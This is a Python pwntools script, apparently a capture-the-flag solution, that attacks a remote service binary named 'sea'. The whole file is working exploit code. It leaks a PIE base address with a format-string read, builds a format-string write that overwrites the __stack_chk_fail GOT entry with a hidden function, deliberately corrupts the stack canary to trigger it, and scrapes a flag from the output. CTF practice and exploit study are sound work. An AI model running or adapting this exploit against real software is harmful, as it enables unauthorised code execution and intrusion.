import re

from pwn import *


context.log_level = "error"
context.arch = "amd64"

HOST = "39.96.193.120"
PORT = 10009

elf = ELF("./sea", checksec=False)


def build_fmt_payload(pie_base: int) -> bytes:
    target_got = pie_base + elf.got["__stack_chk_fail"]
    win = pie_base + elf.symbols["system_reboot_comms"]

    writes = {
        target_got: win & 0xFFFF,
        target_got + 2: (win >> 16) & 0xFFFF,
        target_got + 4: (win >> 32) & 0xFFFF,
    }
    ordered = sorted(writes.items(), key=lambda item: item[1])

    base_index = 16
    while True:
        printed = 0
        parts = []
        for i, (_, value) in enumerate(ordered):
            delta = (value - printed) & 0xFFFF
            if delta:
                parts.append(f"%{delta}c".encode())
            parts.append(f"%{base_index + i}$hn".encode())
            printed = value

        fmt = b"".join(parts)
        aligned = (len(fmt) + 1 + 7) & ~7
        new_base_index = 8 + aligned // 8
        if new_base_index == base_index:
            break
        base_index = new_base_index

    payload = fmt + b"\x00"
    payload = payload.ljust(aligned, b"A")
    payload += b"".join(p64(addr) for addr, _ in ordered)

    # The function reads 0x7c bytes into a 0x68-byte buffer.
    # Overwrite the canary deliberately so the epilogue calls __stack_chk_fail,
    # which now points to system_reboot_comms.
    payload = payload.ljust(120, b"B")
    assert len(payload) <= 0x7C
    return payload


def main() -> None:
    io = remote(HOST, PORT)

    io.recvuntil(b"[Remaining Attempts: 2] > ")
    io.sendline(b"%7$p")
    leak_line = io.recvline().strip()
    leak = int(leak_line, 16)
    pie_base = leak - 0x2078

    io.recvuntil(b"[Remaining Attempts: 1] > ")
    payload = build_fmt_payload(pie_base)
    io.send(payload)

    data = io.recvall(timeout=3)

    candidates = re.findall(rb"[A-Za-z][A-Za-z0-9_]{1,15}\{[^}\r\n]{1,200}\}", data)
    if candidates:
        for item in dict.fromkeys(candidates):
            print(item.decode("ascii", errors="ignore"))
    else:
        text = data.decode("latin1", errors="ignore")
        safe = text.encode("ascii", errors="ignore").decode()
        print(safe)


if __name__ == "__main__":
    main()
